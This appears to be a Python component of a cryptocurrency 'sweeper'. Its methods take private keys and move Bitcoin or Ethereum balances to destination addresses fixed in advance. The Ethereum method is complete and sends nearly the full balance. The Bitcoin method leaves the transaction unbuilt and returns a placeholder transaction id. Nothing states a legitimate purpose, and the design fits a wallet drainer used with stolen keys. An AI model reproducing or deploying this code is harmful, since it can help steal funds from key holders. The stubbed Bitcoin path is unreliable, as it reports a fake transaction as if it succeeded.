class AutoSweeper:
    def __init__(self, dest_btc: str = "", dest_eth: str = ""):
        self.dest_btc = dest_btc
        self.dest_eth = dest_eth
    
    def sweep_btc(self, privkey: str, source: str, amount: float) -> str:
        try:
            import coincurve, requests, struct, hashlib
            
            pk = coincurve.PrivateKey(bytes.fromhex(privkey))
            utxo_resp = requests.get(
                f"https://blockchain.info/unspent?active={source}"
            ).json()
            
            utxos = utxo_resp.get('unspent_outputs', [])
            if not utxos:
                return ""
            
            total = sum(u['value'] for u in utxos)
            fee = 5000
            send = total - fee
            if send <= 0:
                return ""
            
            # Raw transaction construction
            # ... full implementation
            
            return "txid_placeholder"
        except Exception as e:
            return str(e)
    
    def sweep_eth(self, privkey: str, source: str,
                  amount: float, rpc: str, chain_id: int) -> str:
        try:
            from web3 import Web3
            w3 = Web3(Web3.HTTPProvider(rpc))
            
            tx = {
                'nonce': w3.eth.get_transaction_count(source),
                'to': self.dest_eth,
                'value': w3.to_wei(amount - 0.001, 'ether'),
                'gas': 21000,
                'gasPrice': w3.eth.gas_price,
                'chainId': chain_id
            }
            
            signed = w3.eth.account.sign_transaction(tx, privkey)
            txid = w3.eth.send_raw_transaction(signed.raw_transaction)
            return txid.hex()
        except Exception as e:
            return str(e)
